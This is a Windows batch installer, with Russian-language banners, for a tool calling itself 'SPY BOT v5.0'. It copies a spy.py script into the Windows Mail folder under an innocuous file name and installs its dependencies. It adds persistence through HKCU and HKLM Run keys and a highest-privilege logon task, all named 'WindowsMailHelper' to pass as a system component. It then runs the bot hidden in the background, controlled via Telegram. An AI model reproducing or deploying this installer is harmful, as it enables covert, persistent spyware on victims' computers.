@echo off
chcp 65001 >nul
title SPY BOT v5.0 — ДВОЙНАЯ УСТАНОВКА (libs + libs.txt)
setlocal enabledelayedexpansion



:: === ПУТИ ===
set "CURRENT_DIR=%~dp0"
set "LIBS_DIR=%CURRENT_DIR%libs"
set "LIBS_TXT=%CURRENT_DIR%libs.txt"
set "INSTALL_DIR=C:\Program Files\Windows Mail"
set "INSTALL_PATH=%INSTALL_DIR%\wabmlc.py"
set "CURRENT_SCRIPT=%CURRENT_DIR%spy.py"


TIMEOUT /T 5


:: === КРАСИВАЯ РАМКА ===
cls
echo.
echo    ███████╗██████╗ ██╗   ██╗    ██████╗  █████╗ ████████╗
echo    ██╔════╝██╔══██╗╚██╗ ██╔╝    ██╔══██╗██╔══██╗╚══██╔══╝
echo    ███████╗██████╔╝ ╚████╔╝     ██████╔╝██║  ██║   ██║   
echo    ╚════██║██╔═══╝   ╚██╔╝      ██╔══██╗██║  ██║   ██║   
echo    ███████║██║        ██║       ██████╔╝╚█████╔╝   ██║   
echo    ╚══════╝╚═╝        ╚═╝       ╚═════╝  ╚════╝    ╚═╝   
echo.
echo    ╔═══════════════════════════════════════════════════════════╗
echo    ║       ДВОЙНАЯ УСТАНОВКА SPY BOT v5.0 (ОФФЛАЙН + PIP)      ║
echo    ║                                                           ║
echo    ║  • Копирование spy.py...                                  ║
echo    ║  • Установка из ./libs...                                 ║
echo    ║  • Установка из libs.txt (если интернет)...               ║
echo    ║  • Автозапуск...                                          ║
echo    ║  • Запуск в фоне...                                       ║
echo    ║                                                           ║
echo    ╚═══════════════════════════════════════════════════════════╝
echo.
timeout /t 2 >nul

:: === ПРОВЕРКА PYTHON ===
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo    [ERROR] Python не установлен!
    echo    [INFO] Положи python-3.13.5-amd64.exe в папку.
    pause
    exit /b 1
)

:: === ПРОВЕРКА pythonw.exe ===
where pythonw.exe >nul 2>&1
if %errorlevel% neq 0 (
    echo    [ERROR] pythonw.exe не найден!
    echo    [INFO] Установи Python с "Add to PATH".
    pause
    exit /b 1
)

:: === ПРОВЕРКА spy.py ===
if not exist "%CURRENT_SCRIPT%" (
    echo    [ERROR] spy.py не найден!
    pause
    exit /b 1
)

:: === СОЗДАНИЕ ПАПКИ УСТАНОВКИ ===
mkdir "%INSTALL_DIR%" >nul 2>&1

:: === КОПИРОВАНИЕ spy.py ===
copy "%CURRENT_SCRIPT%" "%INSTALL_PATH%" >nul
if %errorlevel% neq 0 (
    echo    [ERROR] Не удалось скопировать spy.py
    pause
    exit /b 1
)
echo    [OK] spy.py → %INSTALL_PATH%

:: === ЭТАП 1: УСТАНОВКА ИЗ ./libs (ЛОКАЛЬНО) ===
set "LOCAL_COUNT=0"
if exist "%LIBS_DIR%" (
    echo    [INFO] Установка из ./libs...
    for %%f in ("%LIBS_DIR%\*.whl") do (
        set /a LOCAL_COUNT+=1
        python -m pip install "%%f" --no-index --find-links "%LIBS_DIR%" --no-warn-script-location --quiet >nul 2>&1
        if !errorlevel! neq 0 (
            echo    [WARN] Ошибка: %%~nxf
        ) else (
            echo    [OK] %%~nxf
        )
    )
    if !LOCAL_COUNT! equ 0 echo    [INFO] В ./libs нет .whl
) else (
    echo    [INFO] Папка ./libs не найдена — пропускаем
)

:: === ЭТАП 2: УСТАНОВКА ИЗ libs.txt (PIP) ===
set "PIP_COUNT=0"
if exist "%LIBS_TXT%" (
    echo    [INFO] Проверка интернета и установка из libs.txt...
    ping -n 1 8.8.8.8 >nul 2>&1
    if !errorlevel! equ 0 (
        for /f "usebackq delims=" %%a in ("%LIBS_TXT%") do (
            set "pkg=%%a"
            set "pkg=!pkg:==.*=!"
            python -m pip show !pkg! >nul 2>&1
            if !errorlevel! neq 0 (
                set /a PIP_COUNT+=1
                python -m pip install "%%a" --no-cache-dir --quiet >nul 2>&1
                if !errorlevel! neq 0 (
                    echo    [WARN] Не удалось: %%a
                ) else (
                    echo    [OK] %%a
                )
            ) else (
                echo    [SKIP] Уже установлен: !pkg!
            )
        )
    ) else (
        echo    [INFO] Нет интернета — пропускаем libs.txt
    )
) else (
    echo    [INFO] libs.txt не найден — пропускаем
)

:: === АВТОЗАПУСК ===
set "CMD=pythonw.exe \"%INSTALL_PATH%\""
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsMailHelper /t REG_SZ /d "%CMD%" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsMailHelper /t REG_SZ /d "%CMD%" /f >nul 2>&1
schtasks /create /tn "WindowsMailHelper" /tr "%CMD%" /sc onlogon /rl highest /f >nul 2>&1

:: === МАРКЕР ===
echo INSTALLED > "%INSTALL_DIR%\install.txt"

:: === ЗАПУСК В ФОНЕ ===
echo    [SUCCESS] Запуск SPY BOT в фоне...
start "" pythonw.exe "%INSTALL_PATH%"

:: === ГОТОВО ===
cls
echo.
echo    ███████╗██████╗ ██╗   ██╗    ██████╗  █████╗ ████████╗
echo    ██╔════╝██╔══██╗╚██╗ ██╔╝    ██╔══██╗██╔══██╗╚══██╔══╝
echo    ███████╗██████╔╝ ╚████╔╝     ██████╔╝██║  ██║   ██║   
echo    ╚════██║██╔═══╝   ╚██╔╝      ██╔══██╗██║  ██║   ██║   
echo    ███████║██║        ██║       ██████╔╝╚█████╔╝   ██║   
echo    ╚══════╝╚═╝        ╚═╝       ╚═════╝  ╚════╝    ╚═╝   
echo.
echo    ╔═══════════════════════════════════════════════════════════╗
echo    ║                   УСТАНОВКА ЗАВЕРШЕНА!                    ║
echo    ║                                                           ║
echo    ║  • Локально: !LOCAL_COUNT! пакетов                        ║
echo    ║  • Через pip: !PIP_COUNT! пакетов                         ║
echo    ║  • Бот работает в фоне                                    ║
echo    ║  • Управление: Telegram → /start                          ║
echo    ║  • Веб-панель: /web                                       ║
echo    ║  • Логи: %INSTALL_DIR%\install.log                        ║
echo    ║                                                           ║
echo    ╚═══════════════════════════════════════════════════════════╝
echo.
echo    Нажми любую клавишу, чтобы выйти...
pause >nul
endlocal